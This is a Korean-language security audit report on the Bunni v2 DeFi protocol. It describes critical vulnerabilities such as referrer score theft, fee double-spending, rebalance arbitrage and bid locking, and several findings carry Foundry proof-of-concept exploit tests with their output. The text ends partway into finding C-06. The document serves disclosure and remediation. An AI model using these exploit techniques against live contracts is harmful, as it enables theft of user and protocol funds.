# 소개

Pashov Audit Group은 이 공간에서 최고의 스마트 계약 보안 연구원들로 구성된 여러 팀으로 이루어져 있습니다. 총 1000개 이상의 보안 취약점을 보고한 이 그룹은 절대적으로 최고의 감사 여정을 만드는 것을 목표로 합니다. 100% 보안은 결코 보장될 수 없지만, 귀하의 블록체인 프로토콜을 위해 숙련된 연구원들의 최선의 노력을 보장합니다. 이전 작업은 [여기](https://github.com/pashov/audits)에서 확인하거나 Twitter [@pashovkrum](https://twitter.com/pashovkrum)으로 문의하세요.

# 면책 조항

스마트 계약 보안 검토는 취약점의 완전한 부재를 결코 확인할 수 없습니다. 이는 시간, 리소스 및 전문 지식이 제한된 노력으로, 우리는 가능한 한 많은 취약점을 찾으려고 노력합니다. 검토 후 100% 보안을 보장할 수 없으며, 검토가 스마트 계약에서 어떤 문제를 발견할 것이라고 보장할 수도 없습니다. 후속 보안 검토, 버그 바운티 프로그램 및 온체인 모니터링을 강력히 권장합니다.

# 소개

**timeless-fi/bunni-v2** 저장소에 대한 시간 제한 보안 검토가 **Pashov Audit Group**에 의해 수행되었으며, 애플리케이션의 스마트 계약 구현의 보안 측면에 중점을 두었습니다.

# Bunni V2 소개

Bunni v2는 사용자의 유동성 관리를 더 간단하고 수익성 있게 만들기 위해 설계된 Automated Market Maker(AMM)입니다. '형태 변환(shapeshifting)' 유동성 및 자동 수수료 재투자(automatic fee compounding)와 같은 기능을 도입하여 수익을 극대화할 수 있는 유연하고 효율적인 방법을 제공합니다.

# 위험 등급 분류

| 심각도 | 영향: 높음 | 영향: 중간 | 영향: 낮음 |
| --- | --- | --- | --- |
| **가능성: 높음** | 치명적 (Critical) | 높음 (High) | 중간 (Medium) |
| **가능성: 중간** | 높음 (High) | 중간 (Medium) | 낮음 (Low) |
| **가능성: 낮음** | 중간 (Medium) | 낮음 (Low) | 낮음 (Low) |

## 영향 (Impact)

- High - 프로토콜 자산의 상당한 물질적 손실을 초래하거나 사용자 그룹에 상당한 피해를 줌.

- Medium - 프로토콜 자산의 중간 정도의 물질적 손실을 초래하거나 사용자 그룹에 중간 정도의 피해를 줌.

- Low - 프로토콜 자산의 경미한 물질적 손실을 초래하거나 소규모 사용자 그룹에 피해를 줌.

## 가능성 (Likelihood)

- High - 온체인 조건을 모방한 합리적인 가정하에 공격 경로가 가능하며, 공격 비용이 도난당하거나 손실될 수 있는 자금의 양에 비해 상대적으로 낮음.

- Medium - 조건부로 인센티브가 주어지는 공격 벡터이지만, 여전히 상대적으로 가능성이 높음.

- Low - 너무 많거나 너무 낮은 가능성의 가정을 가지고 있거나 공격자가 인센티브가 거의 없거나 전혀 없는 상태에서 상당한 지분을 필요로 함.

## 심각도 수준에 따른 조치

- Critical - 가능한 한 빨리 수정해야 함 (이미 배포된 경우).

- High - 수정해야 함 (아직 배포되지 않은 경우 배포 전).

- Medium - 수정하는 것이 좋음.

- Low - 수정할 수 있음.

# 보안 평가 요약

_검토 커밋 해시:_

- [7faae4718eecda1b33dc3abd894431ed2d16c929](https://github.com/timeless-fi/bunni-v2/tree/7faae4718eecda1b33dc3abd894431ed2d16c929)
- [95f4270ad4447e96044973580afda9176730e7c8](https://github.com/Bunniapp/biddog/tree/95f4270ad4447e96044973580afda9176730e7c8)

_수정 검토 커밋 해시:_

- [5fa7fff3d6e4b192367e398a6d264936d7e7b5ea](https://github.com/timeless-fi/bunni-v2/tree/5fa7fff3d6e4b192367e398a6d264936d7e7b5ea)
- [84af5e83b4ca8930cc40bd546c98d2ff6305d07a](https://github.com/timeless-fi/bunni-v2/tree/84af5e83b4ca8930cc40bd546c98d2ff6305d07a)

### 범위 (Scope)

다음 스마트 계약들이 감사 범위에 포함되었습니다:

- `amAmm`
- `BaseHook.sol`
- `Constants.sol`
- `ERC20Referrer.sol`
- `Errors.sol`
- `Permit2Enabled.sol`
- `ReentrancyGuard.sol`
- `SharedStructs.sol`
- `BuyTheDipGeometricDistribution.sol`
- `CarpetedDoubleGeometricDistribution.sol`
- `CarpetedGeometricDistribution.sol`
- `DoubleGeometricDistribution.sol`
- `GeometricDistribution.sol`
- `LibBuyTheDipGeometricDistribution.sol`
- `LibCarpetedDoubleGeometricDistribution.sol`
- `LibCarpetedGeometricDistribution.sol`
- `LibDoubleGeometricDistribution.sol`
- `LibGeometricDistribution.sol`
- `LibUniformDistribution.sol`
- `ShiftMode.sol`
- `UniformDistribution.sol`
- `AdditionalCurrencyLib.sol`
- `AmAmmPayload.sol`
- `BunniHookLogic.sol`
- `BunniHubLogic.sol`
- `BunniSwapMath.sol`
- `ExpMath.sol`
- `FeeMath.sol`
- `HookletLib.sol`
- `Math.sol`
- `Oracle.sol`
- `QueryLDF.sol`
- `QueryTWAP.sol`
- `VaultMath.sol`
- `BunniQuoter.sol`
- `PoolState.sol`
- `BunniHook.sol`
- `BunniHub.sol`
- `BunniToken.sol`
- `BunniZone.sol`

# 발견 사항

# [C-01] 어떤 추천인(referrer)이든 다른 사람의 점수를 훔칠 수 있음

## 심각도

**영향:** 높음 (High)

**가능성:** 높음 (High)

## 설명

`BunniHub.deposit` 함수는 사용자가 자신의 `referrer`를 입력하고 이를 매개변수로 사용하여 `BunniToken`을 발행(mint)할 수 있도록 합니다. `BunniToken` 계약은 `ERC20Referrer` 계약의 하위 계약입니다. 이는 `ERC20Referrer` 계약의 메커니즘을 상속받는데, 발행 후 사용자의 추천인이 변경됩니다.

```solidity
    function _mint(address to, uint256 amount, uint24 referrer) internal virtual {
--snip--
            // Revert if updated balance overflows uint232
            if gt(updatedToBalance, _MAX_BALANCE) {
                mstore(0x00, 0x89560ca1) // `BalanceOverflow()`.
                revert(0x1c, 0x04)
            }
>>          sstore(toBalanceSlot, or(toLocked, or(referrer, updatedToBalance)))
            // Shift `toLocked` to fit into a bool.
            toLocked := shr(255, toLocked)
--snip--
```

따라서 공격자는 다른 사람에게 1 wei 토큰을 예금하여 그들의 추천인 점수를 훔칠 수 있습니다. 구체적인 공격 단계는 부록의 PoC를 참조하시기 바랍니다.

## 권장 사항

추천인은 매번 발행할 때마다 변경하는 대신 사용자가 설정할 수 있도록 해야 합니다.

## 부록: PoC

이 테스트 함수를 `BunniHubTest` 계약에 삽입하세요.

```solidity
    function testYttriumzzPoC0004() external {
        // init pool
        vm.label(address(token0), "token0");
        vm.label(address(token1), "token1");
        vm.label(address(permit2), "permit2");
        Currency currency0 = Currency.wrap(address(token0));
        Currency currency1 = Currency.wrap(address(token1));
        (IBunniToken bunniToken, PoolKey memory key) = _deployPoolAndInitLiquidity(currency0, currency1, ERC4626(address(0)), ERC4626(address(0)));

        // test user
        address userA = makeAddr("userA");
        address userB = makeAddr("userB");
        uint24 referrerA = 0xA;
        uint24 referrerB = 0xB;

        // mint some token0 and token1
        uint256 depositAmount0 = 1e18;
        uint256 depositAmount1 = 1e18;
        uint256 dustAmount = 10;
        _mint(currency0, userA, depositAmount0);
        _mint(currency0, userB, depositAmount0 + dustAmount);
        _mint(currency1, userA, depositAmount1);
        _mint(currency1, userB, depositAmount1 + dustAmount);

        // common depositParams
        IBunniHub.DepositParams memory depositParams;
        depositParams.poolKey = key;
        depositParams.amount0Desired = depositAmount0;
        depositParams.amount1Desired = depositAmount1;
        depositParams.deadline = block.timestamp;

        // userA mint bunniToken
        console.log(">> userA mint bunniToken");
        vm.startPrank(userA);
        token0.approve(address(permit2), type(uint256).max);
        token1.approve(address(permit2), type(uint256).max);
        permit2.approve(address(token0), address(hub), type(uint160).max, type(uint48).max);
        permit2.approve(address(token1), address(hub), type(uint160).max, type(uint48).max);
        depositParams.recipient = userA;
        depositParams.refundRecipient = userA;
        depositParams.referrer = referrerA;
        hub.deposit(depositParams);
        vm.stopPrank();
        console.log("      bunniToken.balanceOf(userA): %s", bunniToken.balanceOf(userA));
        console.log("      bunniToken.scoreOf(referrerA): %s", bunniToken.scoreOf(referrerA));

        // userB mint bunniToken
        console.log(">>>>> userB mint bunniToken");
        vm.startPrank(userB);
        token0.approve(address(permit2), type(uint256).max);
        token1.approve(address(permit2), type(uint256).max);
        permit2.approve(address(token0), address(hub), type(uint160).max, type(uint48).max);
        permit2.approve(address(token1), address(hub), type(uint160).max, type(uint48).max);
        depositParams.recipient = userB;
        depositParams.refundRecipient = userB;
        depositParams.referrer = referrerB;
        hub.deposit(depositParams);
        vm.stopPrank();
        console.log("      bunniToken.balanceOf(userB): %s", bunniToken.balanceOf(userB));
        console.log("      bunniToken.scoreOf(referrerB): %s", bunniToken.scoreOf(referrerB));

        // userB mint dust token to userA
        console.log(">>>>> userB steal score of userA");
        uint256 token0BalanceBefore = token0.balanceOf(userB);
        uint256 token1BalanceBefore = token1.balanceOf(userB);
        vm.startPrank(userB);
        depositParams.amount0Desired = dustAmount;
        depositParams.amount1Desired = dustAmount;
        depositParams.recipient = userA;
        depositParams.refundRecipient = userB;
        depositParams.referrer = referrerB;
        hub.deposit(depositParams);
        vm.stopPrank();
        uint256 token0Cost = token0BalanceBefore - token0.balanceOf(userB);
        uint256 token1Cost = token1BalanceBefore - token1.balanceOf(userB);

        // result
        console.log(">>>>> result");
        console.log("      bunniToken.scoreOf(referrerA): %s", bunniToken.scoreOf(referrerA));
        console.log("      bunniToken.scoreOf(referrerB): %s", bunniToken.scoreOf(referrerB));
        console.log("      userB cost token0 amount: %s", token0Cost);
        console.log("      userB cost token1 amount: %s", token1Cost);
        console.log("      userB cost token1 amount: %s", token1Cost);
    }
```

PoC 실행.

```bash
forge test -vvv --match-test testYttriumzzPoC0004
```

결과.

```bash
$ forge test -vvv --match-test testYttriumzzPoC0004
[⠢] Compiling...
No files changed, compilation skipped

Ran 1 test for test/BunniHub.t.sol:BunniHubTest
[PASS] testYttriumzzPoC0004() (gas: 2194800)
Logs:
  >> userA mint bunniToken
        bunniToken.balanceOf(userA): 1000000000000000000
        bunniToken.scoreOf(referrerA): 1000000000000000000
  >>>>> userB mint bunniToken
        bunniToken.balanceOf(userB): 1000000000000000000
        bunniToken.scoreOf(referrerB): 1000000000000000000
  >>>>> userB steal score of userA
  >>>>> result
        bunniToken.scoreOf(referrerA): 0
        bunniToken.scoreOf(referrerB): 2000000000000000007
        userB cost token0 amount: 2
        userB cost token1 amount: 10

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.12s (3.39ms CPU time)

Ran 1 test suite in 1.18s (1.12s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

# [C-02] 잘못된 amAmm 수수료 금액으로 인한 자금 손실

## 심각도

**영향:** 높음 (High)

**가능성:** 높음 (High)

## 설명

BunniHook에서 amAMM 관리자가 활성화되면, 코드는 `BunniHookLogic.beforeSwap()` 함수에서 `amAmmFeeAmount`에 대해 잘못된 값을 설정합니다.

```solidity
           // decrease output amount
            swapFeeAmount = outputAmount.mulDivUp(swapFee, SWAP_FEE_BASE);
            (amAmmFeeCurrency, amAmmFeeAmount) = (outputToken, swapFeeAmount);

            // take hook fees from swap fee
            // @a: when there's amm whom does hook fee belongs? amFee should be only swapfee-hookfee
            hookFeesAmount = swapFeeAmount.mulDivUp(env.hookFeeModifier, MODIFIER_BASE);
            swapFeeAmount -= hookFeesAmount;
```

보시다시피 코드는 `amAmmFeeAmount`를 `swapFeeAmount`로 설정하고 `BunniHook.beforeSwap()` 함수에서 코드는 이 수수료를 amAMM 관리자에게 할당합니다:

```solidity
        // accrue swap fee to the am-AMM manager if present
        if (useAmAmmFee) {
            _accrueFees(amAmmManager, amAmmFeeCurrency, amAmmFeeAmount);
        }
```

문제는 `BunniHookLogic.beforeSwap()`에서 `amAmmFeeAmount`를 할당한 후 코드가 `swapFeeAmount`에서 `hookFeesAmount`를 빼지만 `amAmmFeeAmount`는 업데이트하지 않는다는 것입니다. 따라서 `amAmmFeeAmount`는 항상 (swapFee 외에) 훅 수수료도 포함하게 되며, amAMM이 활성화되면 프로토콜은 수수료를 전혀 받지 못하게 됩니다(훅 수수료가 amAMM에 할당됨). 훅 수수료를 amAMM 관리자에게 주는 것이 설계상의 선택일 수 있지만, 그럴 경우 `referrerRewardAmount`를 계산할 때 또 다른 문제가 발생합니다.

코드는 훅 수수료의 일부를 추천인에게 분배하며 이를 위해 BunniHook 계약의 자금을 사용합니다:

```solidity
        // distribute part of hookFees to referrers
        if (hookFeesAmount != 0) {
            uint256 referrerRewardAmount = hookFeesAmount.mulDiv(env.referralRewardModifier, MODIFIER_BASE);
            if (referrerRewardAmount != 0) {
--snip--
                bunniState.bunniToken.distributeReferralRewards(isToken0, referrerRewardAmount);
            }
        }
```

코드가 훅 수수료에서 `referrerRewardAmount`를 지출하는 동안 `amAmmFeeAmount`에서는 이를 차감하지 않으므로 `amAmmFeeAmount`는 실제보다 더 높아지고 코드는 `referrerRewardAmount`를 이중 지출하게 됩니다(추천인에게 분배하는 동시에 amAMM 관리자에게도 할당됨).

## 권장 사항

`amAmmFeeAmount = swapFeeAmount - hookFeesAmount` 또는 `amAmmFeeAmount = swapFeeAmount - referrerRewardAmount`로 설정하세요.

# [C-03] Fulfiller가 `BunniHub`와 상호 작용하여 리밸런싱 과정을 중재(arbitrate)할 수 있음

## 심각도

**영향:** 높음 (High)

**가능성:** 높음 (High)

## 설명

리밸런싱 과정은 새로운 주문이 Flood 프로토콜에 제출될 때 시작되며, 이는 스왑 작업 중 특정 조건이 충족될 때 발생합니다.

주문이 제출되면 오프체인 행위자가 리밸런싱 과정의 실행을 시작할 수 있습니다. 이는 `FloodPlain.fulfillOrder` 함수를 호출하고 주문을 매개변수로 전달하여 수행됩니다. 이 호출이 성공하려면 fulfiller가 `BunniZone`에서 승인되어야 하며, 구체적으로 fulfiller는 화이트리스트에 있는 주소이거나 현재 amAMM 관리자여야 합니다. 화이트리스트 주소는 신뢰할 수 있을 것으로 예상되지만, amAMM 관리자는 그렇지 않을 수 있습니다.

`FloodPlain` 계약에서 `fulfillOrder` 함수는 오버로딩되어 있습니다. 함수의 [첫 번째 버전](https://github.com/flood-protocol/flood-contracts/blob/c9891965b29f8e32ed00d9b98356a0833f806e18/src/FloodPlain.sol#L55)은 주문만 매개변수로 받고 `msg.sender`를 fulfiller로 사용합니다. [두 번째 버전](https://github.com/flood-protocol/flood-contracts/blob/c9891965b29f8e32ed00d9b98356a0833f806e18/src/FloodPlain.sol#L80)은 두 개의 추가 매개변수를 받는데, 그 중 하나는 fulfiller 주소입니다. 두 번째 버전에 초점을 맞추고 이 함수가 호출될 때 리밸런싱 흐름이 어떻게 보일지 살펴보겠습니다.

```solidity
File: FloodPlain.sol

    function fulfillOrder(SignedOrder calldata package, address fulfiller, bytes calldata swapData)
        external
        nonReentrant
    {
(...)
        // Check zone accepts the fulfiller. Fulfiller is msg.sender in this case.
1)      if (order.zone != address(0)) if (!(IZone(order.zone).validate(order, fulfiller))) revert ZoneDenied();

        // Execute pre hooks.
2)      order.preHooks.execute();

        // Transfer each offer item to fulfiller using Permit2.
3)      _permitTransferOffer(order, package.signature, orderHash, fulfiller);

        // Call fulfiller to perform swaps and return the sourced consideration amount.
4)      uint256 amount =
            IFulfiller(payable(fulfiller)).sourceConsideration(SELECTOR_EXTENSION, order, msg.sender, swapData);

        // Ensure sufficient consideration amount is sourced by fulfiller.
        if (amount < order.consideration.amount) revert InsufficientAmountReceived();

        // Transfer declared consideration amount from the fulfiller to the offerer.
5)      IERC20(order.consideration.token).safeTransferFrom(fulfiller, order.recipient, amount);

        // Execute post hooks.
6)      order.postHooks.execute();
(...)
    }
```

1. fulfiller 주소가 `BunniZone` 계약에서 승인되었는지 확인합니다.
2. `order.preHooks.execute()`는 `BunniHub` 계약의 `rebalanceOrderPreHook` 함수를 호출합니다. `tokenIn`이 `BunniHub`에서 `BunniHook`으로 전송되고 풀의 `tokenIn` 잔액이 업데이트됩니다.
3. `tokenIn`이 `Permit2` 계약을 통해 `BunniHook`에서 fulfiller에게 전송됩니다.
4. `sourceConsideration` 함수가 fulfiller 계약에서 호출되어 `tokenOut`의 금액을 가져옵니다.
5. `tokenOut`의 금액이 유효하면 fulfiller에서 `BunniHub` 계약으로 전송됩니다.
6. `order.postHooks.execute()`는 `BunniHub` 계약의 `rebalanceOrderPostHook` 함수를 호출합니다. `tokenOut`은 Uniswap의 `PoolManager`에 예치되어 `BunniHub` 계약에 적립되고 풀의 `tokenOut` 잔액이 업데이트됩니다.

보시다시피 fulfiller 계약에서 `sourceConsideration` 함수가 호출될 때(4단계), `tokenIn` 잔액의 감소가 기록되었습니다(2단계). 그러나 이 시점에서 `tokenOut` 잔액의 증가는 아직 기록되지 않았으며 슬롯0들은 `lastSwapTimestamp` 및 `lastSurgeTimestamp` 값을 아직 업데이트하지 않았습니다(6단계).

이는 `sourceConsideration` 함수 내에서 fulfiller가 일관되지 않은 상태에 있는 `BunniHub` 계약과 상호 작용할 수 있음을 의미하며, 일시적인 불일치를 중재할 수 있습니다. PoC 섹션은 `tokenOut`이 풀에 적립되기 전에 유동성을 예치함으로써 fulfiller가 원래보다 더 많은 지분을 발행하는 방법의 예를 보여줍니다.

## 개념 증명 (Proof of Concept)

다음 코드를 `BunniHub.t.sol` 파일에 추가하고 `forge test --mt test_rebalance_arb -vv`를 실행하세요.

```solidity
uint256 deposit0;
uint256 deposit1;

// Implementation of IFulfiller interface
function sourceConsideration(
    bytes28, /* selectorExtension */
    IFloodPlain.Order calldata order,
    address, /* caller */
    bytes calldata data
) external returns (uint256) {
    // deposit liquidity between rebalanceOrderPreHook and rebalanceOrderPostHook
    IBunniHub.DepositParams memory depositParams = abi.decode(data, (IBunniHub.DepositParams));
    (, deposit0, deposit1) = hub.deposit(depositParams);

    return order.consideration.amount;
}

function test_rebalance_arb() external {
    uint256 swapAmount = 1e6;
    uint32 alpha = 359541238;
    uint24 feeMin = 0.3e6;
    uint24 feeMax = 0.5e6;
    uint24 feeQuadraticMultiplier = 1e6;

    MockLDF ldf_ = new MockLDF();
    bytes32 ldfParams = bytes32(abi.encodePacked(ShiftMode.BOTH, int24(-3) * TICK_SPACING, int16(6), alpha));
    ldf_.setMinTick(-30); // minTick of MockLDFs need initialization
    (IBunniToken bunniToken, PoolKey memory key) = _deployPoolAndInitLiquidity(
        Currency.wrap(address(token0)),
        Currency.wrap(address(token1)),
        ERC4626(address(0)),
        ERC4626(address(0)),
        ldf_,
        ldfParams,
        abi.encodePacked(
            feeMin,
            feeMax,
            feeQuadraticMultiplier,
            FEE_TWAP_SECONDS_AGO,
            SURGE_FEE,
            SURGE_HALFLIFE,
            SURGE_AUTOSTART_TIME,
            VAULT_SURGE_THRESHOLD_0,
            VAULT_SURGE_THRESHOLD_1,
            REBALANCE_THRESHOLD,
            REBALANCE_MAX_SLIPPAGE,
            REBALANCE_TWAP_SECONDS_AGO,
            REBALANCE_ORDER_TTL,
            true, // amAmmEnabled
            ORACLE_MIN_INTERVAL
        )
    );

    // shift liquidity to the right
    // the LDF will demand more token0, so we'll have too much of token1
    // the rebalance should swap from token1 to token0
    ldf_.setMinTick(-20);

    // make small swap to trigger rebalance
    _mint(key.currency0, address(this), swapAmount);
    IPoolManager.SwapParams memory params = IPoolManager.SwapParams({
        zeroForOne: true,
        amountSpecified: -int256(swapAmount),
        sqrtPriceLimitX96: TickMath.MIN_SQRT_PRICE + 1
    });
    vm.recordLogs();
    _swap(key, params, 0, "");

    // obtain the order from the logs
    Vm.Log[] memory logs = vm.getRecordedLogs();
    Vm.Log memory orderEtchedLog;
    for (uint256 i = 0; i < logs.length; i++) {
        if (logs[i].emitter == address(floodPlain) && logs[i].topics[0] == IOnChainOrders.OrderEtched.selector) {
            orderEtchedLog = logs[i];
            break;
        }
    }
    IFloodPlain.SignedOrder memory signedOrder = abi.decode(orderEtchedLog.data, (IFloodPlain.SignedOrder));
    IFloodPlain.Order memory order = signedOrder.order;

    // prepare deposit data
    IBunniHub.DepositParams memory depositParams = IBunniHub.DepositParams({
        poolKey: key,
        amount0Desired: 1e18,
        amount1Desired: 1e18,
        amount0Min: 0,
        amount1Min: 0,
        deadline: block.timestamp,
        recipient: address(this),
        refundRecipient: address(this),
        vaultFee0: 0,
        vaultFee1: 0,
        referrer: 0
    });
    _mint(key.currency0, address(this), depositParams.amount0Desired);
    _mint(key.currency1, address(this), depositParams.amount1Desired);

    // fulfill order
    _mint(key.currency0, address(this), order.consideration.amount);
    bytes memory data = abi.encode(depositParams);
    floodPlain.fulfillOrder(signedOrder, address(this), data);

    // quote withdrawal
    IBunniHub.WithdrawParams memory withdrawParams = IBunniHub.WithdrawParams({
        poolKey: key,
        recipient: address(this),
        shares: bunniToken.balanceOf(address(this)),
        amount0Min: 0,
        amount1Min: 0,
        deadline: block.timestamp,
        useQueuedWithdrawal: false
    });
    (uint256 withdraw0, uint256 withdraw1) = quoter.quoteWithdraw(withdrawParams);
    int256 diff0 = int256(withdraw0) - int256(deposit0);
    int256 diff1 = int256(withdraw1) - int256(deposit1);
    console2.log("diff0:", diff0);
    console2.log("diff1:", diff1);
}
```

```js
diff0: 16514757552665550;
diff1: -1;
```

## 권장 사항

`rebalanceOrderPreHook`과 `rebalanceOrderPostHook` 실행 사이에 `BunniHub` 계약 함수에 대한 접근을 잠그는 메커니즘을 확립하세요.

이 메커니즘을 구현하는 방법의 예는 다음과 같습니다:

```diff
File: BunniHub.sol

+   function lockForRebalance(PoolKey calldata key) external {
+       if (address(_getBunniTokenOfPool(key.toId())) == address(0)) revert BunniHub__PoolNotExists();
+       if (msg.sender != address(key.hooks)) revert BunniHub__Unauthorized();
+       _nonReentrantBefore();
+   }
+
+   function unlockForRebalance(PoolKey calldata key) external {
+       if (address(_getBunniTokenOfPool(key.toId())) == address(0)) revert BunniHub__PoolNotExists();
+       if (msg.sender != address(key.hooks)) revert BunniHub__Unauthorized();
+       _nonReentrantAfter();
+   }
```

```diff
File: BunniHook.sol

    function _rebalancePrehookCallback(bytes memory callbackData) internal {
(...)
         // pull claim tokens from BunniHub
        hub.hookHandleSwap({key: key, zeroForOne: zeroForOne, inputAmount: 0, outputAmount: amount});

+       hub.lockForRebalance(key);
+
        // burn and take
        poolManager.burn(address(this), currency.toId(), amount);
        poolManager.take(currency, address(this), amount);
    }

(...)

    function _rebalancePosthookCallback(bytes memory callbackData) internal {
(...)
        poolManager.mint(address(this), currency.toId(), paid);

+       hub.unlockForRebalance(key);
+
        // push claim tokens to BunniHub
        hub.hookHandleSwap({key: key, zeroForOne: zeroForOne, inputAmount: paid, outputAmount: 0});
    }
```

# [C-04] 최고 입찰(Top bid)이 승격(promotion) 전에 다음 입찰(next bid)을 지워서 임대(rent)를 무기한 잠글 수 있음

## 심각도

**영향:** 높음 (High)

**가능성:** 높음 (High)

## 설명

amAMM에서 최고 입찰의 관리자는 이 상태를 유지하는 데 관심이 있을 수 있으며, 특히 받은 수수료에 비해 낮은 임대료를 지불하고 있는 경우 더욱 그렇습니다.

최고 입찰이 다른 입찰로 대체되는 두 가지 방법이 있습니다.

첫 번째는 최고 입찰의 예치금이 고갈되는 경우입니다. 관리자가 자신이 지불하는 임대료가 낮다고 판단하면 `depositIntoTopBid` 함수로 자금을 더 추가하여 고갈을 피할 수 있습니다.

최고 입찰이 대체될 수 있는 다른 방법은 다음 입찰이 최고 입찰의 임대료보다 10% 이상 높은 임대료를 제안하는 것입니다. 최고 입찰이 지불하는 임대료가 받은 수수료에 비해 낮으면 다른 행위자들이 더 높은 임대료를 기꺼이 제안할 것으로 예상되며, 이는 관리자의 이익 마진을 낮추고 LP에게 이익을 줍니다.

다음 입찰이 충족해야 하는 또 다른 조건이 있는데, 그것은 입찰이 제출된 후 최소 K 에포크(24시간)가 지나야 한다는 것입니다.

```solidity
File: AmAmm.sol

function _stateTransitionWrite(uint40 currentEpoch, PoolId id, Bid memory topBid, Bid memory nextBid)
(...)
    // check if K epochs have passed since the next bid was submitted
    // and that the next bid's rent is greater than the top bid's rent + 10%
    // if so, promote next bid to top bid
    uint40 nextBidStartEpoch;
    unchecked {
        // unchecked so that if epoch ever overflows, we simply wrap around
        nextBidStartEpoch = nextBid.epoch + k;
    }
    if (currentEpoch >= nextBidStartEpoch && nextBidIsBetter) {
```

반면에 다음 입찰 관리자는 최고 입찰의 예치금이 최소 K 에포크를 커버할 수 있는 한 입찰을 취소할 수 있습니다.

```solidity
File: AmAmm.sol

function cancelNextBid(PoolId id, address recipient) external virtual override returns (uint256 refund) {
(...)
    // require D_top / R_top >= K
    if (topBid.manager != address(0) && topBid.deposit / topBid.rent < K(id)) {
        revert AmAmm__BidLocked();
    }
```

이러한 조건을 감안할 때, 관리자는 제출 후 K 에포크가 경과하기 전에 다음 입찰을 지우는 것을 계속할 수 있습니다. 이는 더 높은 입찰을 생성하고 취소함으로써 수행할 수 있습니다.

## 개념 증명 (Proof of Concept)

다음 코드를 `AmAmm.t.sol` 파일에 추가하고 `forge test --mt test_LockRent`를 실행하세요.

```solidity
function test_LockRent() external {
    // Setup
    address outbidder = makeAddr("outbidder");
    ERC20Mock bidToken = amAmm.bidToken();
    bidToken.mint(address(this), 2 * K * 1e18);
    bidToken.mint(outbidder, 2 * K * 1e18);
    vm.prank(outbidder);
    bidToken.approve(address(amAmm), type(uint256).max);

    // Create bid with low rent that can last 1 year
    amAmm.bid({
        id: POOL_0,
        manager: address(this),
        payload: _swapFeeToPayload(0.01e6),
        rent: 100,
        deposit: 365 * K * 100
    });

    // After 1 day next bid is promoted to top bid
    skip(K * EPOCH_SIZE);
    IAmAmm.Bid memory topBid = amAmm.getTopBidWrite(POOL_0);
    assertEq(topBid.manager, address(this));

    // A new bid is created
    // 1 day must pass until this bid is promoted to top bid
    vm.prank(outbidder);
    amAmm.bid({
        id: POOL_0,
        manager: outbidder,
        payload: _swapFeeToPayload(0.01e6),
        rent: 1e18,
        deposit: K * 1e18
        });
    IAmAmm.Bid memory nextBid = amAmm.getNextBidWrite(POOL_0);
    assertEq(nextBid.manager, outbidder);

    // After 23 hours top bid manager clears next bid by creating and canceling a new bid
    skip((K - 1) * EPOCH_SIZE);
    amAmm.bid({
        id: POOL_0,
        manager: address(this),
        payload: _swapFeeToPayload(0.01e6),
        rent: 1.11e18,
        deposit: K * 1.11e18
    });
    amAmm.cancelNextBid(POOL_0, address(this));
    nextBid = amAmm.getNextBidWrite(POOL_0);
    assertEq(nextBid.manager, address(0));
}
```

## 권장 사항

문제를 해결하기 위한 첫 번째 옵션은 다음 입찰을 취소하는 옵션을 제거하여 다른 행위자의 입찰을 비용 없이 제거하는 데 악용되지 않도록 하는 것입니다.

더 복잡한 해결책은 모든 입찰의 순서가 지정된 목록을 저장하는 것일 수 있습니다. 입찰자는 입찰을 취소할 때만 환불받으며, 모든 상태 전환에 `nextBid` 대신 목록에서 가장 높은 입찰이 사용됩니다.
# [C-05] 공격자가 BunniHook에서 입찰 및 임대 토큰을 훔칠 수 있음

## 심각도

**영향:** 높음 (High)

**가능성:** 높음 (High)

## 설명

리밸런싱 메커니즘에서 BunniHook이 토큰을 받으면 `rebalanceOrderPostHook()` 함수가 호출되며, 이 함수에서 코드는 받은 금액(풀 토큰 중 하나)을 BunniHub로 전송합니다.

```solidity
        uint256 orderOutputAmount;
        if (args.currency.isNative()) {
            // unwrap WETH output to native ETH
            orderOutputAmount = weth.balanceOf(address(this));
            weth.withdraw(orderOutputAmount);
        } else {
            orderOutputAmount = args.currency.balanceOfSelf();
        }

        // posthook should wrap output tokens as claim tokens and push it from BunniHook to BunniHub and update pool balances
```

문제는 코드가 BunniHook의 모든 토큰 잔액을 BunniHub로 전송한다는 것입니다. 이는 관리자에게 손실을 줄 수 있는데, am-AMM이 켜져 있을 때 입찰 및 임대료는 BunniHook 계약에 ERC20인 BunniToken으로 보관되기 때문입니다. 공격자는 대상 BunniToken을 기반으로 새로운 악성 BunniToken을 생성하여 악성 풀에 대한 리밸런싱을 유발하고 BunniHook의 잔액에서 대상 BunniToken 임대료와 입찰을 훔칠 수 있습니다. POC는 다음과 같습니다:

1. User1이 BunniHub에 <TokenA, TokenB> 쌍으로 새 풀을 생성하고 BunniToken BT1이 생성됩니다. 이 풀에 대해 am-AMM 관리자가 활성화됩니다.
2. 사용자는 입찰 및 임대 토큰(BT1)을 BunniHook으로 보내 am-AMM 관리자가 됩니다.
3. 이제 공격자가 BunniHub에 <BT1, AttackerToken> 쌍으로 새 풀을 생성하고 BT2가 생성됩니다.
4. 이제 공격자 풀(BT2)에 대한 밸런싱이 발생하여 코드가 여분의 AttackerToken을 BT1 토큰으로 스왑하려는 경우, `rebalanceOrderPostHook()` 함수는 BunniHook의 전체 BT1 잔액을 스왑 결과로 사용하고 이를 공격자 풀의 LP 제공자에게 보냅니다.
5. BunniHook에는 관리자의 입찰 및 임대료인 BT1 토큰이 보유되어 있으므로 코드는 이를 공격자 풀(BT2)의 스왑 결과로 사용하여 공격자가 임대료를 훔치게 됩니다.

## 권장 사항

리밸런싱 스왑에서 받은 금액만 BunniHub로 전송하세요.

# [C-06] 추천 점수의 이중 계산으로 인한 토큰 과다 청구

## 심각도

**영향:** 높음 (High)

**가능성:** 높음 (High)

## 설명

공격자는 `BunniToken.sol`의 추천 점수 시스템을 악용하여 한 추천인(`referrer1`)을 사용하여 토큰을 발행한 다음, 다른 추천인(`referrer2`)을 사용하여 추가 토큰을 발행할 수 있습니다. 이러한 조작은 첫 번째 추천인의 점수가 두 번째 추천인에게 이전되는 결과를 낳아 점수가 이중으로 계산되게 합니다. 결과적으로 두 번째 추천인은 자신이 받아야 할 것보다 더 많은 토큰을 청구할 수 있게 되어 보상 자금을 효과적으로 고갈시킵니다.

